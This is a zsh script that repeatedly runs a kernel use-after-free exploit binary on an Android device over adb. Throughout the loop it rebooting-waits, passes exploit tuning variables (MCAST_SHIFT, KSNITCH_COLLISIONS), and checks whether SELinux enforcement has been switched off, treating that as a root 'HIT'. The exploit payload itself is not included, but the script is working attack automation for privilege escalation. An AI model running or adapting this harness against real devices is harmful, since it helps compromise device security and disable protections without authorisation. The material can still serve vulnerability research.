#!/bin/zsh
# shift24 fresh-process grinding: each launch = one live-UAF coin at c0-arm-1.
# Verdicts:
#  - enforce=0                -> HIT (root) — stop
#  - crash, tail at/after "sync pre-stamp" -> shift24 LANDING-CRASH (chain bug info)
#  - crash before route phase -> censored, relaunch
#  - clean exit               -> no live UAF (or silent bail), relaunch
LOGDIR=/Users/wxz/Downloads/HonorFennie/logs
CTRL=$LOGDIR/shift24_grind.log
N=57
MAXN=90
echo "### shift24 grind pass start $(date '+%m-%d %H:%M:%S')" >> $CTRL
while (( N <= MAXN )); do
  echo "=== run$N start $(date '+%m-%d %H:%M:%S') ===" >> $CTRL
  adb wait-for-device 2>/dev/null
  boot=""
  for i in {1..60}; do
    boot=$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
    [[ "$boot" == "1" ]] && break
    sleep 5
  done
  if [[ "$boot" != "1" ]]; then
    echo "run$N boot wait failed" >> $CTRL
    N=$((N+1)); continue
  fi
  waited=0
  load=""
  while (( waited < 300 )); do
    load=$(adb shell 'cut -d" " -f1 /proc/loadavg' 2>/dev/null | tr -d '\r')
    if [[ -z "$load" ]]; then sleep 10; waited=$((waited+10)); continue; fi
    awk -v l="$load" 'BEGIN{exit !(l+0 < 8)}' && break
    sleep 30; waited=$((waited+30))
  done
  echo "run$N load=$load waited=${waited}s" >> $CTRL
  sleep 20
  adb shell "cd /data/local/tmp/a && rm -f run$N.log && MCAST_SHIFT=24 KSNITCH_COLLISIONS=12 GL_STAMP_SYNC=1 ./e" \
    > $LOGDIR/gl_run${N}.host.log 2>&1
  rc=$?
  echo "run$N adb rc=$rc end $(date '+%H:%M:%S')" >> $CTRL
  sleep 20
  fdt=""
  if adb get-state >/dev/null 2>&1; then
    fdt=$(adb shell 'tail -1 /data/log/reliability/faultdetect/history.log' 2>/dev/null | tr -d '\r')
    enf=$(adb shell 'cat /sys/fs/selinux/enforce' 2>/dev/null | tr -d '\r')
    echo "run$N enforce=$enf" >> $CTRL
    if [[ "$enf" == "0" ]]; then
      echo "run$N *** HIT — SELINUX OFF *** $(date '+%H:%M:%S')" >> $CTRL
      break
    fi
  else
    # device offline: wait for reboot then read enforce
    adb wait-for-device 2>/dev/null
    for i in {1..60}; do
      boot=$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
      [[ "$boot" == "1" ]] && break
      sleep 5
    done
    enf=$(adb shell 'cat /sys/fs/selinux/enforce' 2>/dev/null | tr -d '\r')
    fdt=$(adb shell 'tail -1 /data/log/reliability/faultdetect/history.log' 2>/dev/null | tr -d '\r')
    echo "run$N (post-reboot) enforce=$enf" >> $CTRL
    if [[ "$enf" == "0" ]]; then
      echo "run$N *** HIT — SELINUX OFF *** $(date '+%H:%M:%S')" >> $CTRL
      break
    fi
  fi
  hl=$LOGDIR/gl_run${N}.host.log
  reason=$(echo "$fdt" | grep -o 'reason \[[a-z_]*\]')
  if [[ -f $hl ]]; then
    last=$(tail -1 $hl | sed 's/\x1b\[[0-9;]*m//g' | cut -c1-110)
    if grep -q "sync pre-stamp begin" $hl; then
      if [[ $rc -ne 0 ]]; then
        echo "run$N STAMP-CRASH $reason tail: $last" >> $CTRL
      else
        echo "run$N stamp-reached clean-exit tail: $last" >> $CTRL
      fi
    else
      echo "run$N CENSORED $reason tail: $last" >> $CTRL
    fi
  fi
  N=$((N+1))
done
echo "### shift24 grind pass finished $(date '+%H:%M:%S')" >> $CTRL
